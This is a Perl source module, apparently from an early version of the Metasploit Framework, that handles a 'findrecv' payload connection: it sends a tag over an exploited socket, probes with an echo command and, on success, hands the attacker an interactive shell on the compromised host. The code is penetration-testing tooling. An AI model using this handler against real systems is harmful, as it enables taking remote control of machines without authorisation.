

package Msf::PayloadComponent::FindRecvConnection;
use strict;
use base 'Msf::PayloadComponent::ConnectionHandler';
use IO::Socket::INET;
use IO::Select;

my $info = {
  'Keys' => ['findsock'],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new(@_);
  $self->_Info($self->MergeHashRec($info, $self->_Info));
  return($self);
}

# Maximum execution time of this routine is 7 seconds...
sub ChildHandler {
  my $self = shift;
  my $sock = shift;

  # Get tag and make sure its 4 bytes (pad/truncate)
  my $tag = substr($self->GetLocal('FindTag') . ("\x01" x 4), 0, 4);
  
  my $s = Pex::Socket::Tcp->new_from_socket( $sock );
  return if $s->IsError;
  
  # Give the payload time to execute
  sleep(1);

  # Send the recv tag
  $s->Send($tag);
  
  # Flush the recv input buffer
  $s->Recv(-1, 1);
  
  # Send a test probe
  $s->Send("echo ABCDEFG\r\n");

  # Is five seconds long enough?
  my $data = $s->Recv(-1, 5);
  
  if($data =~ /ABCDEFG/) {
    $self->PipeRemoteIn($sock);
    $self->PipeRemoteOut($sock);
    $self->PrintLine('[*] Findrecv found shell...');
    $self->HandleConsole;
    exit(0);
  }

DONE:
  $s->Close;
  return;
}

sub SigHandler {
  my $self = shift;
}

1;
